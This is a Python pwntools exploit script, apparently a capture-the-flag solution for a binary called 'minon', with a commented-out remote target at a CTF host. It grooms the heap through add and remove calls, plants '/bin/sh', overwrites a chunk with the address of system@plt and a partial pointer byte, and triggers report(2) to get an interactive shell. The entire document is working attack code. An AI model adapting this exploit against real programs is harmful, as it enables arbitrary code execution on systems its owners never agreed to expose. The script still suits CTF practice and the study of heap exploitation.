from pwn import *

context.binary = elf = ELF('./minon')
# p = remote('pwn.battlectf.online',1007)
p = process("./minon")
system_plt = elf.plt['system']

gdb.attach(p, gdbscript = '''
           b*0x0000000000401450
           b*0x000000000040167a
           c
           
           ''')
input()
def add(name):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', b'1')
    p.sendafter(b'>', name)
    p.recvuntil(b'> [DEBUG]')

def remove(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>', str(idx).encode('utf-8'))
    p.recvuntil(b'> [DEBUG]')

def report(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', str(idx).encode('utf-8'))

add(b'a'*0x18)
add(b'b'*0x18)
add(b'c'*0x18)
add(b'd'*0x18)
add(b'/bin/sh\x00')

remove(0)
remove(1)
remove(2)
remove(3)

add(flat(system_plt, 0)+b'\xc0')

report(2)

p.interactive()